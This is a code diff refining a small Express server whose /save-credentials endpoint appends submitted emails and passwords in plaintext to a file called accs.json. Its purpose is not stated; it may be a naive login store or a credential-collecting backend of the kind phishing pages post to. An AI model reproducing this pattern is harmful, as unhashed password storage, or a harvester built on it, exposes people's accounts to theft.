@@ -1,34 +1,43 @@
-// Save this as server.js
+// server.js
 const express = require('express');
 const fs = require('fs');
+const path = require('path');
 const app = express();
 
-app.use(express.json());
+app.use(express.json()); // For JSON POST data
+app.use(express.urlencoded({ extended: true })); // For form-encoded data (if needed)
+
+const FILE_PATH = path.join(__dirname, 'accs.json');
 
 app.post('/save-credentials', (req, res) => {
   const { email, pass } = req.body;
 
-  // Read existing data
-  fs.readFile('accs.json', 'utf8', (err, data) => {
+  // Validate input
+  if (!email || !pass) {
+    return res.status(400).json({ message: 'Email and password are required' });
+  }
+
+  // Read the existing file or initialize it
+  fs.readFile(FILE_PATH, 'utf8', (err, data) => {
     let accounts = [];
-    if (!err && data) {
+
+    if (!err && data.trim()) {
       try {
         accounts = JSON.parse(data);
       } catch (e) {
-        // Handle JSON parse error
-        return res.json({ message: 'Error parsing existing data' });
+        return res.status(500).json({ message: 'Error parsing existing data' });
       }
     }
 
     // Append new credentials
     accounts.push({ email, pass });
 
-    // Save back to file
-    fs.writeFile('accs.json', JSON.stringify(accounts, null, 2), (err) => {
+    // Save updated data
+    fs.writeFile(FILE_PATH, JSON.stringify(accounts, null, 2), (err) => {
       if (err) {
-        return res.json({ message: 'Error saving data' });
+        return res.status(500).json({ message: 'Error saving data' });
       }
-      res.json({ message: 'Credentials saved successfully' });
+      res.status(200).json({ message: 'Credentials saved successfully' });
     });
   });
 });
